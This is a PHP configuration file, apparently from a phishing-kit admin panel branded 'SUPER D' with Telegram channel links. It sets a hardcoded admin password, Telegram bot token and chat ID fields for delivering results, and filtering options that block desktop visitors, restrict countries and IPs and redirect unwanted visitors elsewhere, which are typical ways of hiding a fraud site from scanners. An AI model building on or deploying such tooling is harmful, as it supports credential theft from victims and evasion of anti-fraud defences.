<?php
//require_once 'functions.php';
/*
  █████████  █████  █████ ███████████  ██████████ ███████████    ██ ██████████  
 ███░░░░░███░░███  ░░███ ░░███░░░░░███░░███░░░░░█░░███░░░░░███  ███░░███░░░░███ 
░███    ░░░  ░███   ░███  ░███    ░███ ░███  █ ░  ░███    ░███ ░░░  ░███   ░░███
░░█████████  ░███   ░███  ░██████████  ░██████    ░██████████       ░███    ░███
 ░░░░░░░░███ ░███   ░███  ░███░░░░░░   ░███░░█    ░███░░░░░███      ░███    ░███
 ███    ░███ ░███   ░███  ░███         ░███ ░   █ ░███    ░███      ░███    ███ 
░░█████████  ░░████████   █████        ██████████ █████   █████     ██████████  
 ░░░░░░░░░    ░░░░░░░░   ░░░░░        ░░░░░░░░░░ ░░░░░   ░░░░░     ░░░░░░░░░░   
                                                                                
                                                                                
                                                                            
2025 

t.me/dj0ui
t.me/superdzone
t.me/superdsp
*/
define('DATA_DIR', __DIR__ . '/../data/');
define('SITE_NAME', '');
define('ADMIN_PASSWORD',  'nador'); // Change this to a secure password
define('SESSION_TIMEOUT', 1800); // 30 minutes in seconds
define('ONLINE_THRESHOLD', 300); // 5 minutes in seconds to consider a user online
define('TOKEN', ''); // token bot tg
define('CHATID', ''); // chat id tg
define('THEME_MODE', 'light'); // Default theme (light/dark)
define('BLOCK_PC', false); // Enable/disable Block pc
define('OAT', false); // Enable/disable OAT
define('ALLOWED_COUNTRIES', ''); // Comma-separated list of allowed countries (ISO codes) or 'ALL'
define('BLOCKED_IPS', ''); // Comma-separated list of blocked IP addresses
define('SITE_EXIT', ''); // Comma-separated list of blocked IP addresses
define('EMAIL', false); // EMAIL
define('EMAILRES', false); // 
define('TXT', false); // txt
define('sound_notification_enabled', false); // sound

function secureDataDirectory() {

    if (!file_exists(DATA_DIR)) {
        mkdir(DATA_DIR, 0755, true);
    }
    
    $htaccess = DATA_DIR . '.htaccess';
    $htaccessContent = "# Prevent direct access to files\n";
    $htaccessContent .= "<FilesMatch \"\.(json|txt)$\">\n";
    $htaccessContent .= "Order allow,deny\n";
    $htaccessContent .= "Deny from all\n";
    $htaccessContent .= "</FilesMatch>\n";
    
    file_put_contents($htaccess, $htaccessContent);
}

// Function to update config settings
function updateConfig($settings) {
    if (!is_array($settings)) {
        return false;
    }
    
    $configFile = DATA_DIR . 'config.json';
    $currentConfig = [];
    
    // Load existing config if it exists
    if (file_exists($configFile)) {
        $jsonContent = file_get_contents($configFile);
        $currentConfig = json_decode($jsonContent, true) ?: [];
    }
    
    // Merge new settings with existing ones
    $updatedConfig = array_merge($currentConfig, $settings);
    
    // Save updated config
    return file_put_contents($configFile, json_encode($updatedConfig, JSON_PRETTY_PRINT));
}


// Function to get config settings
function getConfig($key = null) {
    $configFile = DATA_DIR . 'config.json';
    $config = [];
    
    // Load config if it exists
    if (file_exists($configFile)) {
        $jsonContent = file_get_contents($configFile);
        $config = json_decode($jsonContent, true) ?: [];
    }
    
    // Return specific key or all settings
    if ($key !== null) {
        return $config[$key] ?? null;
    }
    
    return $config;
}


// Initialize config with default values if not exists
function initializeConfig() {
    $configFile = DATA_DIR . 'config.json';
    
    if (!file_exists($configFile)) {
        // Secure the data directory first
        secureDataDirectory();
        
        $defaultConfig = [
            'password' => password_hash(ADMIN_PASSWORD, PASSWORD_DEFAULT),
            'token' => TOKEN,
            'chatid' => CHATID,
            'oat' => OAT,
            'theme_mode' => THEME_MODE,
            'site_name' => SITE_NAME,
            'allowed_countries' => 'ALL',
            'blocked_ips' => '',
            'site_exit' => '',
            'block_pc' => '',
        ];
        
        file_put_contents($configFile, json_encode($defaultConfig, JSON_PRETTY_PRINT));
    }
}



// Call initialize function
initializeConfig();
?>
